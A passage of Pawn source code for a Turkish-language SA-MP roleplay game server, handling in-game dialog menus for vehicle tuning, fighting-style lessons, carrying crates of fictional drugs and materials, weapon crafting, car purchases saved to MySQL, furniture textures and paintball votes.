			if(listitem == 4) { ShowPlayerDialog(playerid, 206+6, DIALOG_STYLE_LIST, "Jantlar","Offroad\nShadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic\nAhab\nVirtual\nAcces", "Seç", "Geri"); }
			if(listitem == 5) { ShowPlayerDialog(playerid, 206+7, DIALOG_STYLE_LIST, "Ön Tamponlar","Alien Ön Tampon\nX-Flow Ön Tampon\nChrome Ön Tampon\nSlamin Ön Tampon", "Seç", "Geri"); }
			if(listitem == 6) { ShowPlayerDialog(playerid, 206+8, DIALOG_STYLE_LIST, "Arka Tamponlar","Alien Arka Tampon\nX-Flow Arka Tampon\nChrome Arka Tampon\nSlamin Arka Tampon", "Seç", "Geri"); }
			if(listitem == 7) { ShowPlayerDialog(playerid, 206+9, DIALOG_STYLE_LIST, "Nitro","Nitro Sistemi", "Seç", "Geri"); }
			if(listitem == 8)
			{
			    ModifiyeYap(playerid, 1087, 800, 11, 120);
			}
			if(listitem == 9)
			{
				new Float:X,Float:Y,Float:Z,Float:ANGLE,VW,INT, model2;
				GetVehiclePos(kArac[playerid],X,Y,Z);
				GetVehicleZAngle(kArac[playerid],ANGLE);
				model2 = GetVehicleModel(kArac[playerid]);
				VW = GetVehicleVirtualWorld(kArac[playerid]);
				INT = GetPlayerInterior(playerid);
				DestroyVehicle(kArac[playerid]);
				AddStaticVehicleEx(model2,X,Y,Z,ANGLE,0,0,0);
				LinkVehicleToInterior(kArac[playerid], INT);
				SetVehicleVirtualWorld(kArac[playerid],VW);
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModPaintjob] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModExhaust] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModWheels] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModFrontBumper] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRearBumper] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModStereo]  = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModHydraulics] = 0;
				AracModifiyeleri[Arac[kArac[playerid]][aid]][ModNitro] = 0;
				BilgileriKaydet(kArac[playerid]);
				kArac[playerid] = 0;
			}
			//if(listitem == 10) { ShowPlayerDialog(playerid, 206+11, DIALOG_STYLE_INPUTTEXT, "Renk","Renk1'i girin.", "Seç", "Geri"); }
		}
		else
		{
		    kArac[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == 253)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    for(new i; i < sizeof(ChangeColor); i++)
                {
                	TextDrawSetPreviewModel(ChangeColor[i], 19349);
                    TextDrawShowForPlayer(playerid,ChangeColor[i]);
                    renk1ayarliyo[playerid] = 1;
                }
                SelectTextDraw(playerid, 0xFFFFFF66) ;
			}
			else if(listitem == 1)
			{
			    for(new i; i < sizeof(ChangeColor); i++)
                {
                	TextDrawSetPreviewModel(ChangeColor[i], 19349);
                    TextDrawShowForPlayer(playerid,ChangeColor[i]);
                    renk2ayarliyo[playerid] = 1;
                }
                SelectTextDraw(playerid, 0xFFFFFF66) ;
			}
			else if(listitem == 2) return ShowPlayerDialog(playerid, 206+1, DIALOG_STYLE_LIST, "Paintjob","Paintjob 1\nPaintjob 2\nPaintjob 3\nPaintjob Sil", "Seç", "Geri");
			else if(listitem == 3)
			{
			    new BigString[3098];
			    for(new i = 0; i < sizeof(ColorList); i++)
				{
					format(BigString, sizeof(BigString), "%s%s", BigString, ColorList[i]);
				}
				format(BigString, sizeof(BigString), "%s\n\n"C2"ÖRN: Renk1,Renk2",BigString);
			    ShowPlayerDialog(playerid, 310, DIALOG_STYLE_INPUT, "RenkID", BigString, "Renk Deðiþ", "Ýptal");
			}
		}
		return 1;
	}
	if(dialogid == 254)
	{
	    if(response)
	    {
	        new mstring[128];
			format(mstring,sizeof(mstring),"Dövüþ baþlama süresini %f dakika olarak deðiþtirdiniz.",floatstr(inputtext));
			Bilgi(playerid, mstring);
			dovussure = floatstr(inputtext);
	    }
	    return 1;
	}
	if(dialogid == 255)
	{
	    if(response)
	    {
	    	new id = GetPVarInt(playerid, "IsyeriBuy");
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(Karakter[playerid][box] == 3) return Hata(playerid, "Zaten boxing öðrenmiþsiniz.");
	                if(GetPlayerMoney(playerid) < 10000) return Hata(playerid, "Yeterli miktarda para taþýmýyorsunuz.");
                    new sure=gettime();
	                if(sure-Karakter[playerid][dovusure] < 259200) return Hata(playerid, "3 günde bir derse katýlabilirsiniz.");
	                GivePlayerCash(playerid, -10000);
					DovusOgren(playerid, 5);
					Isyeri[id][ikasa] += 1000;
	            }
	            case 1:
	            {
	                if(Karakter[playerid][kungfu] == 3) return Hata(playerid, "Zaten kungfu öðrenmiþsiniz.");
	                if(GetPlayerMoney(playerid) < 25000) return Hata(playerid, "Yeterli miktarda para taþýmýyorsunuz.");
	                new sure=gettime();
	                if(sure-Karakter[playerid][dovusure] < 259200) return Hata(playerid, "3 günde bir derse katýlabilirsiniz.");
	                GivePlayerCash(playerid, -25000);
					DovusOgren(playerid, 6);
					Isyeri[id][ikasa] += 2500;
	            }
	            case 2:
	            {
	                if(Karakter[playerid][kneehead] == 3) return Hata(playerid, "Zaten kneehead öðrenmiþsiniz.");
	                if(GetPlayerMoney(playerid) < 25000) return Hata(playerid, "Yeterli miktarda para taþýmýyorsunuz.");
	                new sure=gettime();
	                if(sure-Karakter[playerid][dovusure] < 259200) return Hata(playerid, "3 günde bir derse katýlabilirsiniz.");
	                GivePlayerCash(playerid, -25000);
					DovusOgren(playerid, 7);
					Isyeri[id][ikasa] += 2500;
	            }
	            case 3:
	            {
	                if(Karakter[playerid][grabkick] == 3) return Hata(playerid, "Zaten grabkick öðrenmiþsiniz.");
                    if(GetPlayerMoney(playerid) < 50000) return Hata(playerid, "Yeterli miktarda para taþýmýyorsunuz.");
	                new sure=gettime();
	                if(sure-Karakter[playerid][dovusure] < 259200) return Hata(playerid, "3 günde bir derse katýlabilirsiniz.");
	                GivePlayerCash(playerid, -50000);
					DovusOgren(playerid, 15);
					Isyeri[id][ikasa] += 5000;
				}
	            case 4:
	            {
	                if(Karakter[playerid][elbow] == 3) return Hata(playerid, "Zaten elbow öðrenmiþsiniz.");
	                if(GetPlayerMoney(playerid) < 50000) return Hata(playerid, "Yeterli miktarda para taþýmýyorsunuz.");
	                new sure=gettime();
	                if(sure-Karakter[playerid][dovusure] < 259200) return Hata(playerid, "3 günde bir derse katýlabilirsiniz.");
	                GivePlayerCash(playerid, -50000);
	                DovusOgren(playerid, 16);
	                Isyeri[id][ikasa] += 5000;
				}
	        }
		}
	    return 1;
	}
	if(dialogid == 256)
	{
	    if(response)
		{
			switch(listitem)
			{
				case 0:
				{
				    dovustil[playerid] = 4;
                    SetPlayerFightingStyle(playerid, 4);
                    Bilgi(playerid, "Dövüþ stilinizi normal olarak ayarladýnýz.");
				}
				case 1:
				{
					if(Karakter[playerid][box] < 3) return DovusStilMenu(playerid);
					dovustil[playerid] = 5;
                    SetPlayerFightingStyle(playerid, 5);
                    Bilgi(playerid, "Dövüþ stilinizi boxing olarak ayarladýnýz.");
				}
				case 2:
				{
					if(Karakter[playerid][kungfu] < 3) return DovusStilMenu(playerid);
					dovustil[playerid] = 6;
                    SetPlayerFightingStyle(playerid, 6);
                    Bilgi(playerid, "Dövüþ stilinizi kungfu olarak ayarladýnýz.");
				}
				case 3:
				{
					if(Karakter[playerid][kneehead] < 3) return DovusStilMenu(playerid);
					dovustil[playerid] = 7;
                    SetPlayerFightingStyle(playerid, 7);
                    Bilgi(playerid, "Dövüþ stilinizi kneehead olarak ayarladýnýz.");
				}
				case 4:
				{
					if(Karakter[playerid][grabkick] < 3) return DovusStilMenu(playerid);
					dovustil[playerid] = 15;
                    SetPlayerFightingStyle(playerid, 15);
                    Bilgi(playerid, "Dövüþ stilinizi grabkick olarak ayarladýnýz.");
				}
				case 5:
				{
					if(Karakter[playerid][elbow] < 3) return DovusStilMenu(playerid);
					dovustil[playerid] = 16;
                    SetPlayerFightingStyle(playerid, 16);
                    Bilgi(playerid, "Dövüþ stilinizi elbow olarak ayarladýnýz.");
				}
			}
		}
		return 1;
	}
	if(dialogid == 257)
	{
	    if(response)
	    {
	        new vid = GetPVarInt(playerid, "AracID");
	        if(IsAMyBoat(vid))
	        {
	            if(!UKutuBirak(playerid)) return Hata(playerid, "Kutu býrakma yerinde deðilsiniz.");
	            switch(listitem)
	            {
	                case 0:
	                {
	                    if(AUyusturucu[vid][esrar] <= 0) return Hata(playerid, "Araçta esrar kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][esrar]--;
	                }
	                case 1:
	                {
	                    if(AUyusturucu[vid][amfetamin] <= 0) return Hata(playerid, "Araçta amfetamin haplarý kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][amfetamin]--;
	                }
	                case 2:
	                {
	                    if(AUyusturucu[vid][metamfetamin] <= 0) return Hata(playerid, "Araçta metamfetamin haplarý kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][metamfetamin]--;
	                }
	                case 3:
	                {
	                    if(AUyusturucu[vid][lsd] <= 0) return Hata(playerid, "Araçta lsd haplarý kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][lsd]--;
	                }
	                case 4:
	                {
	                    if(AUyusturucu[vid][extacy] <= 0) return Hata(playerid, "Araçta extacy haplarý kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][extacy]--;
	                }
	                case 5:
	                {
	                    if(AUyusturucu[vid][kokain] <= 0) return Hata(playerid, "Araçta kokain kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][kokain]--;
	                }
	                case 6:
	                {
	                    if(AUyusturucu[vid][eroin] <= 0) return Hata(playerid, "Araçta eroin kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][eroin]--;
	                }
	                case 7:
	                {
	                    if(AUyusturucu[vid][morfin] <= 0) return Hata(playerid, "Araçta morfin ilacý kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][morfin]--;
	                }
	                case 8:
	                {
	                    if(AUyusturucu[vid][MDA] <= 0) return Hata(playerid, "Araçta mda haplarý kutusu bulunmamaktadýr.");
	                    AUyusturucu[vid][MDA]--;
	                }
	            }
	            Kutular[vid]--;
	            UKutuTasiyor[playerid] = listitem+1;
		    	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
		    	kindex[playerid] = BosIndex(playerid);
		    	SetPlayerAttachedObject(playerid, kindex[playerid], 2912, 1, 0.160999, 0.501999, -0.260000, 8.500000, 10.599993, -96.300041, 0.623000, 0.542000, 0.697999);
	            SetPlayerCheckpoint(playerid, 2735.4873,-2550.1667,13.6464, 2.5);
				meslekbul[playerid] = 1;
				AracKaydet(vid);
				DeletePVar(playerid, "AracID");
	        }
	        else
	        {
				if(listitem == 0)
				{
				    if(Materyal[vid][A] == 0) return Hata(playerid, "Araçta A materyal kutusu bulunmamaktadýr.");
				    if(!IsPlayerInRangeOfPoint(playerid, 30, 2219.4485,-2682.6692,13.5409)) return Hata(playerid, "Kutu býrakma yerinde deðilsiniz.");
					Materyal[vid][A]--;
					Kutular[vid]--;
					KutuVer(playerid, 1);
					SetPlayerCheckpoint(playerid, 2219.4485,-2682.6692,13.5409, 2.5);
					//KutuBirak[playerid] = 1;
				}
				if(listitem == 1)
				{
				    if(Materyal[vid][B] == 0) return Hata(playerid, "Araçta B materyal kutusu bulunmamaktadýr.");
				    if(!IsPlayerInRangeOfPoint(playerid, 30, 2219.4485,-2682.6692,13.5409)) return Hata(playerid, "Kutu býrakma yerinde deðilsiniz.");
					Materyal[vid][B]--;
					Kutular[vid]--;
					KutuVer(playerid, 2);
					SetPlayerCheckpoint(playerid, 2219.4485,-2682.6692,13.5409, 2.5);
					//KutuBirak[playerid] = 2;
				}
				if(listitem == 2)
				{
				    if(Materyal[vid][C] == 0) return Hata(playerid, "Araçta C materyal kutusu bulunmamaktadýr.");
				    if(!IsPlayerInRangeOfPoint(playerid, 30, 2219.4485,-2682.6692,13.5409)) return Hata(playerid, "Kutu býrakma yerinde deðilsiniz.");
					Materyal[vid][C]--;
					Kutular[vid]--;
					KutuVer(playerid, 3);
					SetPlayerCheckpoint(playerid, 2219.4485,-2682.6692,13.5409, 2.5);
					//KutuBirak[playerid] = 3;
				}
				if(listitem == 3)
				{
				    if(Materyal[vid][D] == 0) return Hata(playerid, "Araçta D materyal kutusu bulunmamaktadýr.");
				    if(!IsPlayerInRangeOfPoint(playerid, 30, 2219.4485,-2682.6692,13.5409)) return Hata(playerid, "Kutu býrakma yerinde deðilsiniz.");
					Materyal[vid][D]--;
					Kutular[vid]--;
					KutuVer(playerid, 4);
					SetPlayerCheckpoint(playerid, 2219.4485,-2682.6692,13.5409, 2.5);
					//KutuBirak[playerid] = 4;
				}
				if(listitem == 4)
				{
				    if(Materyal[vid][E] == 0) return Hata(playerid, "Araçta E materyal kutusu bulunmamaktadýr.");
				    if(!IsPlayerInRangeOfPoint(playerid, 30, 2219.4485,-2682.6692,13.5409)) return Hata(playerid, "Kutu býrakma yerinde deðilsiniz.");
					Materyal[vid][E]--;
					Kutular[vid]--;
					KutuVer(playerid, 5);
					SetPlayerCheckpoint(playerid, 2219.4485,-2682.6692,13.5409, 2.5);
					//KutuBirak[playerid] = 4;
				}
				meslekbul[playerid] = 1;
				AracKaydet(vid);
				DeletePVar(playerid, "AracID");
			}
	    }
	    return 1;
	}
	if(dialogid == 258)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0:	MateryalMenu(playerid, "22");
			    case 1: MateryalMenu(playerid, "24");
			    case 2: MateryalMenu(playerid, "25");
			    case 3: MateryalMenu(playerid, "28");
			    case 4: MateryalMenu(playerid, "29");
			    case 5: MateryalMenu(playerid, "30");
			    case 6: MateryalMenu(playerid, "31");
			    case 7: MateryalMenu(playerid, "32");
			    case 8: MateryalMenu(playerid, "33");
			}
	    }
	    return 1;
	}
	if(dialogid == 259)
	{
	    if(response)
	    {
	        new i;
			for(new iq;iq<sizeof(SilahVerileri);iq++)
			{
				if(MateryalSilah[playerid] == SilahVerileri[iq][0])
				{
					i = iq;
					break;
				}
			}
	        if(Karakter[playerid][matA] < SilahVerileri[i][1] || Karakter[playerid][matB] < SilahVerileri[i][2] || Karakter[playerid][matC] < SilahVerileri[i][3] || Karakter[playerid][matD] < SilahVerileri[i][4] || Karakter[playerid][matE] < SilahVerileri[i][5]) return Hata(playerid, "Yeterli materyaliniz yok.");
	        Karakter[playerid][matA] -= SilahVerileri[i][1];
			Karakter[playerid][matB] -= SilahVerileri[i][2];
			Karakter[playerid][matC] -= SilahVerileri[i][3];
			Karakter[playerid][matD] -= SilahVerileri[i][4];
			Karakter[playerid][matE] -= SilahVerileri[i][5];
			//SetTimerEx("SilahFab", 120000, false, "udd", playerid, SilahVerileri[i][0], 0);
			Karakter[playerid][silahuretimid] = SilahVerileri[i][0];
			Karakter[playerid][silahpayday] = SilahVerileri[i][6];
			KarakterKaydet(playerid);
			new mstring[64];
			format(mstring, sizeof(mstring), "Silah yapýyorsunuz, bekleyin.((%d PAYDAY))", SilahVerileri[i][6]);
			Bilgi(playerid, mstring);
	    }
	}
	if(dialogid == 260)
	{
		if(response)
		{
		    new i;
			for(new iq;iq<sizeof(SilahVerileri);iq++)
			{
				if(MateryalSilah[playerid] == SilahVerileri[iq][0])
				{
					i = iq;
					break;
				}
			}
		    if(Karakter[playerid][matD] < SilahVerileri[i][4]) return Hata(playerid, "Yeterli materyaliniz yok.");
		    Karakter[playerid][matD] -= SilahVerileri[i][4];
		    SetTimerEx("SilahFab", 60000, false, "udd", playerid, SilahVerileri[i][0], 1);
		    Bilgi(playerid, "Mermi yapýyorsunuz, bekleyin.((1 DAKIKA))");
		    DONDUR(playerid);
		}
	}
	if(dialogid == 261)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0: AracRenk1(playerid);//RENK1
			    case 1: AracRenk2(playerid);//RENK2
			    case 2://HIZSABIT
				{
				    if(!IsDoorVehicleEx(SectigiArac[playerid])) return AracSatinalMenu(playerid);
					if(SectigiHizSabit[playerid] == 0)
					{
					    SectigiHizSabit[playerid] = 1;
					}
					else if(SectigiHizSabit[playerid] == 1)
					{
					    SectigiHizSabit[playerid] = 0;
					}
					AracSatinalMenu(playerid);
				}
				case 3: KilitSec(playerid);
				case 4: AlarmSec(playerid);
				case 5: ImmoSec(playerid);
			    case 6: AracSatinalMenu(playerid);//KM
			    case 7: AracSatinalMenu(playerid);//KOLTUK SAYI
			    case 8: AracSatinalMenu(playerid);//FIYAT
			    case 9: AracSatinalMenu(playerid);//VERGI
			    case 10://ONAYLA
			    {
			    	if(Karakter[playerid][para] >= AldigiAracFiyati[playerid])
			        {
			            new hurdaArac = 0, new_vehicle_sql_id;
						new query[1024];
						for(new i; i < MAX_VEHICLES; i++) {
							if(Arac[i][ahurda] == 1) {
							    new_vehicle_sql_id = i;
								hurdaArac = i;
								LinkVehicleToInterior(i, 0);
								SetVehicleVirtualWorld(i, 0);
								AracModifiyeleriSil(i);
								DestroyVehicle(i);
								break;
							}
						}
						if(!hurdaArac) {
							format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
				            new Cache:cache = mysql_query(query,true);
				            new_vehicle_sql_id = cache_insert_id();
							cache_delete(cache);
						}
						new vehicleid = CreateVehicle(SectigiArac[playerid], 555.704406, -1272.088256, 19.052700, 0, SectigiAracRenk1[playerid], SectigiAracRenk2[playerid], -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = SectigiArac[playerid];
						    Arac[vehicleid][arenk1] = SectigiAracRenk1[playerid];
						    Arac[vehicleid][arenk2] = SectigiAracRenk2[playerid];
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 555.704406;
						    Arac[vehicleid][aposy] = -1272.088256;
						    Arac[vehicleid][aposz] = 19.052700;
						    Arac[vehicleid][avworld] = 0;
						    Arac[vehicleid][ainterior] = 0;
						    Arac[vehicleid][afiyat] = AldigiAracFiyati[playerid];
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = SectigiYakit[playerid];
							Arac[vehicleid][ahizsabit] = SectigiHizSabit[playerid];
							Arac[vehicleid][akilittip] = SectigiKilit[playerid];
							Arac[vehicleid][aalarm] = SectigiAlarm[playerid];
							Arac[vehicleid][aimmo] = SectigiImmo[playerid];
							Arac[vehicleid][sigorta] = 0;
							Arac[vehicleid][vergi] = 0;
							Arac[vehicleid][ahurda] = 0;
							Arac[vehicleid][akm] = 0;
							Arac[vehicleid][ametre] = 0;
							Arac[vehicleid][aisyeri] = 0;
							Arac[vehicleid][agelir] = 0;
							Aractamiri(vehicleid);
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -AldigiAracFiyati[playerid]);
							Bilgi(playerid, "Yeni bir araç satýn aldýnýz! - /arac");
							//Ipucu(playerid, "Aracýnýza plaka almayý unutmayýn.");
							if(Arac[vehicleid][ahizsabit] == 1) Ipucu(playerid, "CTRL tuþuna basýlý tutarak aracýn hýzýný sabitleyebilirsiniz.");
							Ipucu(playerid, "Aracýnýza sigorta yaptýrmayý unutmayýn, sigorta yaptýrmazsanýz aracýnýz yok olabilir.");
							new araclogla[110];
							format(araclogla, sizeof(araclogla), "[GALERI - /a satinal] Galeriden %d idli araci satin aldi. model: %d fiyat: %d aowner: %d", Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat], Arac[vehicleid][aowner]);
							Log(playerid, araclogla);
						}
					}
			    }
			}
	    }
	    return 1;
	}
	if(dialogid == 262)
	{
		if(response)
		{
		    new i=mobilyaci3[playerid];
		    if(listitem == 10)
		    {
				Bilgi(playerid, "Objenin texture'ýný sýfýrladýnýz.");
		        Mobilya[i][mtexture][0] = 0;
		        Mobilya[i][mtexture][1] = 0;
		        DestroyDynamicObject(Mobilya[i][mobje]);
		        Mobilya[i][mobje] = CreateDynamicObject(Mobilya[i][mmodel], Mobilya[i][mx], Mobilya[i][my], Mobilya[i][mz], Mobilya[i][mrx],Mobilya[i][mry],Mobilya[i][mrz],Mobilya[i][mvw],Mobilya[i][mint]);
		        Streamer_Update(playerid);
		        return 1;
		    }
			new id=listitem+1;
			new mstring[128];
			format(mstring, sizeof(mstring), "Texture %d olarak ayarladýnýz.",id);
			Bilgi(playerid, mstring);
			new mid2 = GetPVarInt(playerid, "SectigiTexture");
			Mobilya[i][mtexture][mid2] = id;
			new mindex = GetPVarInt(playerid, "SectigiTexture");
			TextureVer(i, id, mindex);
			Streamer_Update(playerid);
			MobilyaKaydet(i);
			ShowPlayerDialog(playerid, 262, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", "Texture 1\nTexture 2\nTexture 3\nTexture 4\nTexture 5\nTexture 6\nTexture 7\nTexture 8\nTexture 9\nTexture 10\nTexture Sil", "Seç", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 263)
	{
	    if(response)
	    {
	        ShowPlayerDialog(playerid, 264, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", "Texture\nTexture Renk", "Seç", "Ýptal");
	        SetPVarInt(playerid, "SectigiTexture", listitem);
	    }
	    return 1;
	}
	if(dialogid == 264)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, 262, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", "Texture 1\nTexture 2\nTexture 3\nTexture 4\nTexture 5\nTexture 6\nTexture 7\nTexture 8\nTexture 9\nTexture 10\nTexture Sil", "Seç", "Ýptal");
			}
	        if(listitem == 1)
	        {
				ShowPlayerDialog(playerid, 265, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", "{468499}Renk 1\n{800080}Renk 2\n{800000}Renk 3\n{808080}Renk 4\n{daa520}Renk 5\n{31698a}Renk 6\n{6dc066}Renk 7\n{ff7f50}Renk 8\n{d64d4d}Renk 9\n{6b3e26}Renk 10\n{ffffff}Renk Sil", "Seç", "Ýptal");
	        }
	    }
	    return 1;
	}
	if(dialogid == 265)
	{
	    if(response)
	    {
	        new id = GetPVarInt(playerid, "SectigiTexture");
	        new i=mobilyaci3[playerid];
	        new rtext[64],mstring[128];
	        if(listitem == 0)
	            rtext = "{468499}Renk 1";
            if(listitem == 1)
	            rtext = "{800080}Renk 2";
            if(listitem == 2)
	            rtext = "{800000}Renk 3";
            if(listitem == 3)
	            rtext = "{808080}Renk 4";
            if(listitem == 4)
	            rtext = "{daa520}Renk 5";
            if(listitem == 5)
	            rtext = "{31698a}Renk 6";
            if(listitem == 6)
	            rtext = "{6dc066}Renk 7";
            if(listitem == 7)
                rtext = "{ff7f50}Renk 8";
            if(listitem == 8)
                rtext = "{d64d4d}Renk 9";
            if(listitem == 9)
                rtext = "{6b3e26}Renk 10";
            if(listitem == 10)
			{
				Mobilya[i][mtexturerenk][id] = -1;
				TextureVer(i, Mobilya[i][mtexture][id], id);
				Streamer_Update(playerid);
			    Bilgi(playerid, "Mobilyanýn rengini sildiniz.");
			    MobilyaKaydet(i);
			    return 1;
			}
			Mobilya[i][mtexturerenk][id] = listitem;
			TextureVer(i, Mobilya[i][mtexture][id], id);
			Streamer_Update(playerid);
			format(mstring, sizeof(mstring), "Mobilyanýzýn rengini %s {ffffff}olarak ayarladýnýz.",rtext);
			Bilgi(playerid, mstring);
			MobilyaKaydet(i);
			ShowPlayerDialog(playerid, 265, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", "{468499}Renk 1\n{800080}Renk 2\n{800000}Renk 3\n{808080}Renk 4\n{daa520}Renk 5\n{31698a}Renk 6\n{6dc066}Renk 7\n{ff7f50}Renk 8\n{d64d4d}Renk 9\n{6b3e26}Renk 10\n{ffffff}Renk Sil", "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 266)
	{
	    if(response)
	    {
		    SectigiArac[playerid] = GaleriListesi[listitem][0];
		    //printf("%d", SectigiArac[playerid]);
		    return AracSatinalMenu(playerid);
		}
		return 1;
	}
	
	if(dialogid == 275)
	{
	    if(response)
		{
	        new _mid = strval(inputtext),mstring[128],mtext[2],pid=KDuzenleVar[playerid];
			switch(GetPVarInt(playerid,"MatSec"))
			{
			    case 1: Karakter[pid][matA] = _mid, mtext = "A";
			    case 2: Karakter[pid][matB] = _mid, mtext = "B";
			    case 3: Karakter[pid][matC] = _mid, mtext = "C";
				case 4: Karakter[pid][matD] = _mid, mtext = "D";
				case 5: Karakter[pid][matE] = _mid, mtext = "E";
			}
	        format(mstring, 128, "%s adlý oyuncunun %s materyalini %d olarak deðiþtirdiniz.",OyuncuAdiniBul(pid),mtext,_mid);
	        Bilgi(playerid, mstring);
	    }
	    return 1;
	}
	if(dialogid == 276)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0:
				{
	                SendClientMessage(playerid,COLOR_YELLOW,"{E84D4D}[Paintball]{FFFFFF} Oyunuzu Deagle silahýndan yana kullandýnýz.");
	                DeagleVote++;
	                if(DeagleVote == 1) SetTimer("PaintBallStart",30000,false);
	                new string[128];
					format(string,sizeof(string),"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþlýyor. Oyuncu sayýsý: %d",PBPlayers);
					SendClientMessage(playerid,-1,string);
				}
				case 1:
				{
	                SendClientMessage(playerid,COLOR_YELLOW,"{E84D4D}[Paintball]{FFFFFF} Oyunuzu Shotgun silahýndan yana kullandýnýz.");
	                ShotgunVote++;
	                if(ShotgunVote == 1) SetTimer("PaintBallStart",30000,false);
	                new string[128];
					format(string,sizeof(string),"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþlýyor. Oyuncu sayýsý: %d",PBPlayers);
					SendClientMessage(playerid,-1,string);
				}
				case 2:
				{
	                SendClientMessage(playerid,COLOR_YELLOW,"{E84D4D}[Paintball]{FFFFFF} Oyunuzu M4 silahýndan yana kullandýnýz.");
	                M4Vote++;
	                if(M4Vote == 1) SetTimer("PaintBallStart",30000,false);
	                new string[128];
					format(string,sizeof(string),"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþlýyor. Oyuncu sayýsý: %d",PBPlayers);
					SendClientMessage(playerid,-1,string);
				}
				case 3:
				{
	                SendClientMessage(playerid,COLOR_YELLOW,"{E84D4D}[Paintball]{FFFFFF} Oyunuzu MP5 silahýndan yana kullandýnýz.");
	                Mp5Vote++;
	                if(Mp5Vote == 1) SetTimer("PaintBallStart",30000,false);
	                new string[128];
					format(string,sizeof(string),"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþlýyor. Oyuncu sayýsý: %d",PBPlayers);
					SendClientMessage(playerid,-1,string);
				}
				case 4:
				{
	                SendClientMessage(playerid,COLOR_YELLOW,"{E84D4D}[Paintball]{FFFFFF} Oyunuzu Sniper silahýndan yana kullandýnýz.");
	                SnipeVote++;
	                if(SnipeVote == 1) SetTimer("PaintBallStart",30000,false);
	                new string[128];
					format(string,sizeof(string),"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþlýyor. Oyuncu sayýsý: %d",PBPlayers);
					SendClientMessage(playerid,-1,string);
				}
			}
		}
		ShowPlayerDialog(playerid, 314, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Takým Seçimi", "Takým A\nTakým B", "Seç", "");
		return 1;
	}
	if(dialogid == 277)
	{
	    if(response)
	    {
	        switch(listitem) {
	            case 0: {
	            	if(GetPlayerCash(playerid) < 750) return Hata(playerid, "Yeterli paranýz yok. [750$]");
					GivePlayerCash(playerid, -750);
	            }
	            case 4: {
	            	if(GetPlayerCash(playerid) < 550) return Hata(playerid, "Yeterli paranýz yok. [550$]");
					GivePlayerCash(playerid, -550);
	            }
	            case 5: {
	            	if(GetPlayerCash(playerid) < 650) return Hata(playerid, "Yeterli paranýz yok. [650$]");
					GivePlayerCash(playerid, -650);
	            }
	            case 6: {
	            	if(GetPlayerCash(playerid) < 550) return Hata(playerid, "Yeterli paranýz yok. [550$]");
					GivePlayerCash(playerid, -550);
	            }
				default: {
					if(GetPlayerCash(playerid) < 250) return Hata(playerid, "Yeterli paranýz yok. [250$]");
					GivePlayerCash(playerid, -250);
				}
			}
		    UKutuTasiyor[playerid] = listitem+1;
		    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
		    kindex[playerid] = BosIndex(playerid);
